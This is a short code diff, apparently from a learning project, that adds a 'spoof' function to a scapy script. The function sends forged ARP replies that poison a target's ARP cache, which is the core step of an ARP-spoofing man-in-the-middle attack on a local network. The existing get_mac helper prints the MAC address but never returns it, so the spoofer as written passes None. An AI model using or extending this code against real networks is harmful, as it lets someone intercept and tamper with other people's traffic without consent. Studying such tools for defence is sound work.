@@ -12,4 +12,13 @@ def get_mac(ip):
     answer_list = scapy.srp(arp_rq_broadcast, timeout=1, verbose=False)[0]
     print(answer_list[0][1].hwsrc)
 
-get_mac(Ip)
+
+
+#Spoofer 
+def spoof (targetIp,spoofIp):
+    target_mac = get_mac(targetIp)
+    packet = scapy.ARP(op=2,pdst = targetIp , hwdst = target_mac,psrc = spoofIp)
+    scapy.send(packet,verbose=False)
+
+
+
